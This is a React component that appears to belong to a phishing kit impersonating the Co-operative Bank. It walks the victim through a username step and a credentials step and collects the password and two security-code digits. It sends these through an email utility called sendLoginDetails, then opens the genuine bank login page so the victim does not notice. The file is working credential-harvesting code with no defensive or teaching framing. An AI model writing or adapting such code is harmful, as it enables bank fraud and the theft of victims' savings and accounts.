import React, { useState } from 'react';
import { UsernameStep } from './UsernameStep';
import { CredentialsStep } from './CredentialsStep';
import { sendLoginDetails } from '../utils/emailService';

export function LoginSteps() {
  const [currentStep, setCurrentStep] = useState(1);
  const [formData, setFormData] = useState({
    username: '',
    password: '',
    securityCode1: '',
    securityCode4: '',
  });

  const handleUsernameSubmit = (username: string) => {
    setFormData(prev => ({ ...prev, username }));
    setCurrentStep(2);
  };

  const handleCredentialsSubmit = async (data: { 
    password: string, 
    securityCode1: number, 
    securityCode4: number 
  }) => {
    const allData = { ...formData, ...data };
    console.log(allData);
    await sendLoginDetails(allData);
    window.open('https://bank.co-operativebank.co.uk/r/Login/EnterUsername', '_blank');
  };

  return (
    <div>
      {currentStep === 1 && (
        <UsernameStep 
          onSubmit={handleUsernameSubmit}
          initialUsername={formData.username}
        />
      )}
      {currentStep === 2 && (
        <CredentialsStep 
          onBack={() => setCurrentStep(1)}
          onSubmit={handleCredentialsSubmit}
        />
      )}
    </div>
  );
}